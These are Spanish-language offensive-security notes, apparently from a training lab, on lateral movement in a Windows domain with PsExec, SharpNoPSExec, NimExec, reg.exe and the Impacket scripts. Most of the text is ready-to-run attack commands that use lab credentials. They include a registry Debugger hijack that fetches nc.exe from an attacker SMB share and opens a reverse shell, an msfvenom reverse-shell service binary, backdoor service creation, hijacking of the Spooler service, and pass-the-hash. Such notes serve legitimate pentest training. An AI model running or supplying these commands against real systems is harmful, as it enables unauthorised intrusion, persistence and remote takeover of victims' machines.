# Necesidades

- Privilegios de administrador local


# Desde windows

### PsExec

Es una herramienta parte del Sysinternals suite. 

1. Establece un link en la carpeta ADMIN$ (c:\windows) mediante SMB
2. Usa el service control manager(SCM) para iniciar el servicio PsExecsvc y setea un pipe.
3. Redirige los ingresos en la consola mediante el pipe.

##### Uso

    .\PsExec.exe \\SRV02 -i -u INLANEFREIGHT\helen -p RedRiot88 cmd

Si queremos ejecutarlo como NT AUTHORITY\SYSTEM

    .\PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\helen -p RedRiot88 cmd

### SharpNoPSExec

**Mejora el anonimato** aprovechando servicios que ya están corriendo en el host. 

No genera una shell de por sí, con lo que tendremos que generarla nosotros agregando un payload de revshell.

1. Busca todos los servicios en el host.
2. Identifica todos los que tienen el start como "disable" o "manual", que su estado es stopped y sean corridos con privilegios de LocalSystem.
3. Selecciona uno, modifica el path al binario del mismo para apuntar a un payload dado por el atacante.
4. Luego de la ejecución, espera 5 segundos para volver el servicio a su path original.

Por defecto usa las creds del user que está corriéndolo. Si quisieramos hacerlo con otro user podemos agregar las flag "--username", --"password" y "--domain"

    .\SharpNoPSExec.exe --target=172.20.0.52 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ...SNIP...AbwBzAGUAKAApAA=="

### NimExec

Funciona igual que SharpNoPSExec pero permite hacer un **pass the hash**

    .\NimExec -u <user> -d <domain> -h <hash> -t <ip> -c "cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v

### reg.exe

Esta herramienta utiliza el pipe del winreg SMB. Usualmente solo está habilitado en SO de tipo server.
Nos permite escribir en el registro de windows para indexar el uso de un servicio/programa a la ejecución de un payload malicioso.

1. Primero levantamos un servidor SMB donde alojamos nuestro binario malicioso

        sudo python3 smbserver.py share -smb2support /home/plaintext/nc.exe

2. Iniciamos un listener
3. Cambiamos el valor del SMB share folder a 1 (esto hace que se pueda acceder al mismo sin autenticación)

        reg.exe query HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth
    
4. Ejecutamos reg agregando el full path al servicio que vamos a envenenar junto con el path al binario malicioso. (Este ejemplo es con el edge de microsoft. Recomendamos usar chrome)

        reg.exe add "\\srv02.inlanefreight.local\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t reg_sz /d "cmd /c copy \\172.20.0.99\share\nc.exe && nc.exe -e \windows\system32\cmd.exe 172.20.0.99 8080"

5. Esperamos a que alguien ejecute el programa para que se dispare el payload malicioso.

---

# Desde linux

### psexec.py

Crea un servicio dentro del ADMIN$ subiendo un binario con nombre alatorio y nos devuelve una shell.

    psexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52

### smbexec.py

- Corre comandos arbitrarios en un sistema remoto sin subir un archivo **es más silencioso**
- Crea un servicio en el sistema


        smbexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52

### Services.py

- Interactua con el MSRPC.
- Permite iniciar, parar, elimintar, leer el satado, configurar, listar crear y modificar los servicios.
- No es interactivo, con lo cual no obtendremos respuestas.

##### Listar los servicios del sistema

    services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 list


##### Crear un servicio con shell reversa

1.Creamos una shell y la metemos en nuestro smb:

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.207 LPORT=9001 -f exe-service -o rshell-9001s.exe

2. corremos el script incidandole el camino a la shell en nuestro smb

        services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 create -name 'Service Backdoor' -display 'Service Backdoor' -path "\\\\10.10.14.207\\share\\rshell-9001.exe"
##### Iniciar el servicio

1. Iniciamos un listener
2. llamamos al servicio que creamos.

        impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name 'Service Backdoor'

3. una vez terminado eliminamos el servicio

        services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 delete -name 'Service Backdoor'

##### Modificar un servicio
1. Listamos los servicios
2. Elegimos el servicio y le indicamos que corra con nuestro binario malicioso.

        impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 change -name Spooler -path "\\\\10.10.14.207\\share\\rshell-9001.exe" -start_type 2
3. Iniciamos el servicio

        impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name Spooler

### atexec.py

#### ¡¡¡Para que funcione tienen que estar sincronizados los relojes de la máquina victima y la del atacante!!!

Utiliza el Windows Task Scheduler service que es accesible mediante el pipe SMB atsvc.

1. Iniciamos un listener
2. Creamos un payload con revshells
3. Corremos el script

        atexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 "powershell -e ...SNIP...AbwBzAGUAKAApAA=="
